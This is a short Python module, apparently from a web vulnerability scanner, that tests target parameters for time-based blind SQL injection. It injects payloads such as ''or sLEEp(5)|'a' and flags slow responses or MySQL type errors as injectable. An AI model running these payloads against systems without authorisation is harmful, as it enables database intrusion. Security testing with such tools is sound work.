# coding: utf-8
'''
Created on Nov 12, 2019

@author: guimaizi
'''
import time
from config_module import param_process, http_testing, config_function
class sqlinj_testing:
    def __init__(self):
        '''注入测试'''
        self.config= config_function.config_function()
        self.param_process= param_process.param_process(["'or sLEEp(5)|'a", " aNd sLEEp(5) "])
        self.http_testing= http_testing.http_testing()
    def run(self):
        for target_list in self.param_process.main(self.config.callback_target()):
            #print(target_list)
            for target in target_list:
                start = time.time()
                #print(target)
                response=self.http_testing.callback_response(target['data'])
                end = time.time()
                if end-start>4 or 'Truncated incorrect DOUBLE value' in response:
                    self.config.Generated_text('sqlinj : %s\n%s'%(target['name_param'],target['data']))
                    time.sleep(3)
if __name__ == '__main__':
    p1=sqlinj_testing()
    p1.run()